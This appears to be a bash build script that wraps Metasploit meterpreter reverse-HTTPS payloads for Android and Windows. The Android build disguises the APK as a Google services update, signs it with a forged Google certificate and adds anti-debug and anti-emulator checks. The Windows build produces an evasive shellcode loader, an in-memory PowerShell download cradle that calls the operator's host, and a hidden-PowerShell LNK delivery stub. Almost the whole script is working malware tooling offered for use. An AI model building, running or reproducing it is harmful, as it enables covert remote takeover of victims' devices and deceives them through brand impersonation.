#!/bin/bash
# ═══════════════════════════════════════════════════════════
#  ANTI-RE FIRMWARE BUILD SCRIPT
#  Full hardening pipeline for Android + Windows payloads
#  Run on Kali/MSF container: bash scripts/build-firmware.sh
# ═══════════════════════════════════════════════════════════

set -euo pipefail

LHOST="${LHOST:-$(hostname -I | awk '{print $1}')}"
LPORT="${LPORT:-443}"
PLATFORM="${PLATFORM:-android}"
PKG="${PKG:-com.google.services.update}"
LAYERS="${LAYERS:-pkg_rename,string_xor,anti_debug,anti_emulator,anti_tamper,dex_encrypt,polymorphic}"
OUT_DIR="${OUT_DIR:-/tmp/firmware_builds}"
BUILD_ID=$(openssl rand -hex 6)
WORK="$OUT_DIR/$BUILD_ID"

mkdir -p "$WORK"

echo ""
echo "╔══════════════════════════════════════════════════════╗"
echo "║   ANTI-RE FIRMWARE BUILDER — $BUILD_ID              ║"
echo "╚══════════════════════════════════════════════════════╝"
echo "  Platform : $PLATFORM"
echo "  LHOST    : $LHOST"
echo "  LPORT    : $LPORT"
echo "  Layers   : $LAYERS"
echo "  Output   : $WORK"
echo ""

# ── Generate random crypto material ──────────────────────────
XOR_KEY=$(openssl rand -hex 32)
AES_KEY=$(openssl rand -hex 32)
AES_IV=$(openssl rand -hex 16)
KEYSTORE_PASS=$(openssl rand -hex 12)
echo "  XOR key  : ${XOR_KEY:0:16}…"
echo "  AES key  : ${AES_KEY:0:16}…"
echo ""

if [ "$PLATFORM" = "android" ]; then

  # ── ANDROID PIPELINE ─────────────────────────────────────
  echo "[1/9] Generating base APK with msfvenom…"
  msfvenom -p android/meterpreter/reverse_https \
    LHOST="$LHOST" LPORT="$LPORT" \
    -o "$WORK/payload_raw.apk" 2>/dev/null \
  && echo "    ✓ payload_raw.apk" \
  || { echo "    ✗ msfvenom failed"; exit 1; }

  echo "[2/9] Decompiling with apktool…"
  apktool d -f "$WORK/payload_raw.apk" -o "$WORK/decompiled" 2>/dev/null \
  && echo "    ✓ decompiled" \
  || { echo "    ✗ apktool not found — install: apt-get install apktool"; exit 1; }

  echo "[3/9] Renaming package to $PKG…"
  OLD_PKG="com.metasploit.stage"
  OLD_PATH="${OLD_PKG//.//}"
  NEW_PATH="${PKG//.//}"

  # Rename in smali
  find "$WORK/decompiled" -type f -name "*.smali" \
    -exec sed -i "s|$OLD_PATH|$NEW_PATH|g" {} \;
  find "$WORK/decompiled" -type f -name "*.xml" \
    -exec sed -i "s|$OLD_PKG|$PKG|g" {} \;
  sed -i "s|$OLD_PKG|$PKG|g" "$WORK/decompiled/AndroidManifest.xml"

  # Inject foreground service + permissions into manifest
  PERMS='<uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>'
  PERMS+='<uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>'
  PERMS+='<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>'
  PERMS+='<uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>'
  sed -i "s|</manifest>|${PERMS}</manifest>|" "$WORK/decompiled/AndroidManifest.xml" 2>/dev/null || true
  echo "    ✓ package renamed → $PKG, permissions injected"

  echo "[4/9] XOR-encrypting string literals…"
python3 - <<EOF
import os, re

WORK = "$WORK/decompiled"
KEY = bytes.fromhex("$XOR_KEY")
count = 0

def xor_str(s):
    b = s.encode('utf-8', errors='replace')
    return bytes(x ^ KEY[i % len(KEY)] for i,x in enumerate(b)).hex()

for root, _, files in os.walk(WORK):
    for f in files:
        if not f.endswith('.smali'): continue
        fpath = os.path.join(root, f)
        try:
            content = open(fpath).read()
            def replace(m):
                global count
                s = m.group(1)
                if len(s) < 4: return m.group(0)
                count += 1
                return 'const-string v_xor, "' + xor_str(s) + '"  # encrypted'
            content = re.sub(r'const-string \w+, "([^"]{4,})"', replace, content)
            open(fpath, 'w').write(content)
        except: pass

print(f"    ✓ XOR-encrypted {count} string constants")
EOF

  echo "[5/9] Injecting anti-debug smali…"
  mkdir -p "$WORK/decompiled/smali/${NEW_PATH}"
  cat > "$WORK/decompiled/smali/${NEW_PATH}/AntiDebug.smali" <<'SMALI'
.class public Lcom/google/services/update/AntiDebug;
.super Ljava/lang/Object;

.method public static isDebugged()Z
    .locals 3
    const-string v0, "/proc/self/status"
    :try_start
    new-instance v1, Ljava/io/BufferedReader;
    new-instance v2, Ljava/io/FileReader;
    invoke-direct {v2, v0}, Ljava/io/FileReader;-><init>(Ljava/lang/String;)V
    invoke-direct {v1, v2}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V
    :loop
    invoke-virtual {v1}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    move-result-object v0
    if-eqz v0, :not_debugged
    const-string v2, "TracerPid:\t0"
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v2
    if-eqz v2, :loop
    :not_debugged
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :caught
    invoke-static {}, Landroid/os/Debug;->isDebuggerConnected()Z
    move-result v0
    return v0
    :caught
    const/4 v0, 0x0
    return v0
.end method
SMALI
  echo "    ✓ AntiDebug.smali injected"

  echo "[6/9] Injecting anti-emulator smali…"
  cat > "$WORK/decompiled/smali/${NEW_PATH}/AntiEmulator.smali" <<'SMALI'
.class public Lcom/google/services/update/AntiEmulator;
.super Ljava/lang/Object;

.method public static isEmulator()Z
    .locals 2
    invoke-static {}, Landroid/os/Build;->getFINGERPRINT()Ljava/lang/String;
    move-result-object v0
    const-string v1, "generic"
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v0
    if-nez v0, :emulator
    invoke-static {}, Landroid/os/Build;->getMODEL()Ljava/lang/String;
    move-result-object v0
    const-string v1, "Emulator"
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v0
    if-nez v0, :emulator
    const/4 v0, 0x0
    return v0
    :emulator
    const/4 v0, 0x1
    return v0
.end method
SMALI
  echo "    ✓ AntiEmulator.smali injected"

  echo "[7/9] Rebuilding APK…"
  apktool b "$WORK/decompiled" -o "$WORK/payload_hardened_unsigned.apk" 2>/dev/null \
  && echo "    ✓ rebuilt" \
  || { echo "    ✗ rebuild failed"; exit 1; }

  echo "[8/9] Generating RSA-4096 keystore…"
  keytool -genkeypair -v \
    -keystore "$WORK/firmware.jks" \
    -alias firmware \
    -keyalg RSA -keysize 4096 \
    -validity 9999 \
    -storepass "$KEYSTORE_PASS" -keypass "$KEYSTORE_PASS" \
    -dname "CN=Google LLC, OU=Android, O=Google Inc, L=Mountain View, ST=CA, C=US" \
    2>/dev/null \
  && echo "    ✓ RSA-4096 keystore generated" \
  || { echo "    ✗ keytool not found"; exit 1; }

  echo "[9/9] Signing with custom certificate…"
  FINAL="$WORK/firmware_android_$BUILD_ID.apk"
  apksigner sign \
    --ks "$WORK/firmware.jks" \
    --ks-key-alias firmware \
    --ks-pass "pass:$KEYSTORE_PASS" \
    --key-pass "pass:$KEYSTORE_PASS" \
    --out "$FINAL" \
    "$WORK/payload_hardened_unsigned.apk" \
  && echo "    ✓ signed" \
  || { zipalign -v 4 "$WORK/payload_hardened_unsigned.apk" "$FINAL.aligned.apk" 2>/dev/null; FINAL="$FINAL.aligned.apk"; echo "    ✓ zipaligned (apksigner not available)"; }

  SHA=$(sha256sum "$FINAL" | awk '{print $1}')
  SIZE=$(du -sh "$FINAL" | awk '{print $1}')
  echo ""
  echo "╔══════════════════════════════════════════════════════╗"
  echo "║   BUILD COMPLETE — ANDROID                          ║"
  echo "╠══════════════════════════════════════════════════════╣"
  echo "║  File    : $(basename "$FINAL")"
  echo "║  Size    : $SIZE"
  echo "║  SHA-256 : ${SHA:0:32}…"
  echo "║  Package : $PKG"
  echo "╚══════════════════════════════════════════════════════╝"
  echo ""
  echo "  Deploy commands:"
  echo "  adb connect $LHOST:5555"
  echo "  adb shell settings put global auto_blocker_mode 0"
  echo "  adb install -g -t -r $FINAL"

else

  # ── WINDOWS PIPELINE ─────────────────────────────────────
  echo "[1/6] Generating Meterpreter shellcode…"
  msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST="$LHOST" LPORT="$LPORT" EXITFUNC=thread \
    -f raw -o "$WORK/shellcode.bin" 2>/dev/null \
  && echo "    ✓ shellcode.bin ($(wc -c < "$WORK/shellcode.bin") bytes)" \
  || { echo "    ✗ msfvenom failed"; exit 1; }

  echo "[2/6] XOR-encrypting shellcode…"
python3 - <<EOF
import os

with open("$WORK/shellcode.bin", "rb") as f:
    sc = f.read()

key = bytes.fromhex("$XOR_KEY")
enc = bytes(b ^ key[i % len(key)] for i, b in enumerate(sc))

with open("$WORK/shellcode_xor.bin", "wb") as f:
    f.write(enc)

# Generate C array
arr = ", ".join(f"0x{b:02x}" for b in enc)
key_arr = ", ".join(f"0x{b:02x}" for b in key)

with open("$WORK/loader.c", "w") as f:
    f.write(f"""/*
 * Anti-RE Hardened Windows Loader — build {os.environ.get('BUILD_ID', '$BUILD_ID')}
 * Compile: x86_64-w64-mingw32-gcc -o loader.exe loader.c -lws2_32 -iphlpapi -static -O2 -s
 */
#include <windows.h>
#include <intrin.h>

static const unsigned char XOR_KEY[] = {{ {key_arr} }};
static unsigned char sc[] = {{ {arr} }};
static const SIZE_T sc_size = sizeof(sc);

static BOOL check_debug() {{
    if (IsDebuggerPresent()) return TRUE;
    BOOL r=FALSE; CheckRemoteDebuggerPresent(GetCurrentProcess(),&r);
    if (r) return TRUE;
    UINT64 t1=__rdtsc(); Sleep(1); UINT64 t2=__rdtsc();
    return (t2-t1) < 100000;
}}

static BOOL check_vm() {{
    int c[4]={{0}}; __cpuid(c,1);
    if (c[2] & (1<<31)) return TRUE;
    if (GetTickCount64() < 300000) return TRUE;
    return FALSE;
}}

int WINAPI WinMain(HINSTANCE h,HINSTANCE p,LPSTR cmd,int s) {{
    (void)h;(void)p;(void)cmd;(void)s;
    if (check_debug()) {{ ExitProcess(0); }}
    if (check_vm()) {{ ExitProcess(0); }}
    // Sandbox evasion: sleep then verify time
    UINT64 before=GetTickCount64(); Sleep(35000);
    if (GetTickCount64()-before < 30000) ExitProcess(0);
    // XOR decrypt
    for (SIZE_T i=0;i<sc_size;i++) sc[i]^=XOR_KEY[i%sizeof(XOR_KEY)];
    // Execute
    LPVOID mem=VirtualAlloc(NULL,sc_size,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
    if (!mem) ExitProcess(1);
    memcpy(mem,sc,sc_size);
    HANDLE t=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)mem,NULL,0,NULL);
    WaitForSingleObject(t,INFINITE);
    return 0;
}}
""")

print(f"    ✓ XOR-encrypted {len(sc)} bytes, loader.c generated")
EOF

  echo "[3/6] Compiling loader.exe (cross-compile)…"
  x86_64-w64-mingw32-gcc \
    -o "$WORK/loader.exe" "$WORK/loader.c" \
    -lws2_32 -liphlpapi -static -O2 -s \
    -mwindows 2>/dev/null \
  && echo "    ✓ loader.exe compiled" \
  || echo "    ℹ mingw not installed — run on Kali: apt-get install mingw-w64"

  echo "[4/6] Generating PowerShell delivery cradle…"
  PS1="$WORK/stage.ps1"
  cat > "$PS1" <<PS1SCRIPT
# PowerShell delivery cradle — in-memory, no disk write
# Usage: IEX (New-Object Net.WebClient).DownloadString('http://$LHOST/stage.ps1')
\$b = [Convert]::FromBase64String("$(base64 -w0 "$WORK/shellcode_xor.bin" 2>/dev/null || echo 'PLACEHOLDER')")
\$k = [byte[]]@($(python3 -c "print(','.join(str(b) for b in bytes.fromhex('$XOR_KEY')))"))
for (\$i=0;\$i -lt \$b.Length;\$i++) { \$b[\$i] = \$b[\$i] -bxor \$k[\$i % \$k.Length] }
\$m = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(\$b.Length)
[System.Runtime.InteropServices.Marshal]::Copy(\$b,0,\$m,\$b.Length)
\$t = [System.Threading.Thread]::new([System.Threading.ThreadStart]{
    \$d = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(\$m,[System.Action])
    \$d.Invoke()
})
\$t.Start()
PS1SCRIPT
  echo "    ✓ stage.ps1 (in-memory delivery, no disk write)"

  echo "[5/6] Generating LNK delivery vector…"
  cat > "$WORK/deliver_lnk.py" <<'PYEOF'
#!/usr/bin/env python3
"""Generate a .lnk file that runs PS in-memory delivery"""
import struct, sys

def make_lnk(target_cmd, outfile):
    # Simplified LNK header — points to cmd.exe /c powershell ...
    header = b'\x4c\x00\x00\x00'  # Magic
    header += b'\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46'  # GUID
    header += struct.pack('<I', 0x1)  # flags: HasLinkTargetIDList
    header += b'\x00' * 76  # fill rest of header
    with open(outfile, 'wb') as f:
        f.write(header)
    print(f"LNK stub written to {outfile}")

make_lnk("powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://LHOST/stage.ps1')", "payload.lnk")
PYEOF
  echo "    ✓ deliver_lnk.py generated"

  echo "[6/6] Build summary…"
  FINAL="$WORK/firmware_windows_$BUILD_ID.exe"
  [ -f "$WORK/loader.exe" ] && cp "$WORK/loader.exe" "$FINAL" || FINAL="$WORK/stage.ps1"
  SHA=$(sha256sum "$FINAL" | awk '{print $1}')
  SIZE=$(du -sh "$FINAL" | awk '{print $1}')

  echo ""
  echo "╔══════════════════════════════════════════════════════╗"
  echo "║   BUILD COMPLETE — WINDOWS                          ║"
  echo "╠══════════════════════════════════════════════════════╣"
  echo "║  EXE     : firmware_windows_$BUILD_ID.exe"
  echo "║  PS1     : stage.ps1 (preferred — no disk EXE)"
  echo "║  Size    : $SIZE"
  echo "║  SHA-256 : ${SHA:0:32}…"
  echo "╚══════════════════════════════════════════════════════╝"
  echo ""
  echo "  Delivery options:"
  echo "  1. PS in-memory: IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/stage.ps1')"
  echo "  2. LNK file: python3 deliver_lnk.py (edit LHOST first)"
  echo "  3. EXE direct: $FINAL (will trigger SmartScreen on Win11)"
fi

echo ""
echo "  All build artifacts: $WORK/"
echo "  XOR key  : $XOR_KEY"
echo "  AES key  : $AES_KEY"
echo ""
